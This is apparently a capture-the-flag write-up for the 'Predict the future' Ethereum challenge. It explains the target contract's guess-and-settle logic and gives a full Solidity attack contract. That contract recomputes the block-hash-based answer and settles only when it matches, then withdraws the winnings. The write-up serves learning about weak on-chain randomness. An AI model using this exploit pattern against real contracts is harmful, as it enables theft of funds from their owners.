#Predict the future

##Challenge

##Solution

This challenge separates guess placement from the ether settlement process. To 'lockInGuess' the puzzle requires a payment of one ether. The 'lockInGuess' function also assigns 3 state variables: the 'guesser' is the address making the guess, the 'n' value is the guess, and 'settlementBlockNumber' is the transaction's block number plus one.

The settlement process requires the function caller to satisfy three conditions prior to receiving a transfer of 2 ether:
- The 'settle' function call must be from the same address that made the guess
- The block number of the 'settle' transaction must be greater than the 'lockInGuess' transaction block
- The 'settle' function regenerates a new 'answer' to memory which is then checked against the function caller's guess value in contract state storage.

To solve this puzzle, we deploy an attack contract of our own which will include its own 'require' statements to check for these conditions prior to sending the message call. This process is a bit tedious and will require a bit of luck. I got it on the 5th try. Then replicated it and didn't get to make the call again for over 10 minutes.

Here is my Solidity contract solution, with notes:

pragma solidity ^0.4.24;

// interface referenced in the 'pull' contract
interface PredictTheFutureChallenge {
    function lockInGuess(uint8 n) public payable;
    function settle() public;
}

contract pull {
    address owner;

    // instantiate
    PredictTheFutureChallenge public predictFuture;

    // establish ownership of contract at deployment transaction
    constructor() public payable {
        owner = msg.sender;
    }

    // step 1: find contract address of vulnerable contract and input here
    function PredictTheFutureChallengePull(address _predictFuture) public {
        predictFuture = PredictTheFutureChallenge(_predictFuture);
    }

    // step 2: send 1 ether with this transaction along with guess of zero
    // I picked zero (can be any number between 0 - 9, inclusive)
    function futureGuesser() public payable {
        predictFuture.lockInGuess.value(msg.value)(0);
    }

    // step 3: submit this guy over and over until you get it right
    // revert should return any unspent gas, so it's not free but still cheap...
    function settlement() public {
        uint8 settleGuess = uint8(keccak256(blockhash(block.number - 1), now)) % 10;
        require(settleGuess == 0);
        predictFuture.settle();
    }

    // step 5: withdraw funds from pull contract back to externally owned address
    function withdraw() public {
        require(owner == msg.sender);
        msg.sender.transfer(address(this).balance);
    }

    // step 4: funds are automatically sent to
    // fallback function from vulnerable contract
    function() public payable {
    }

}
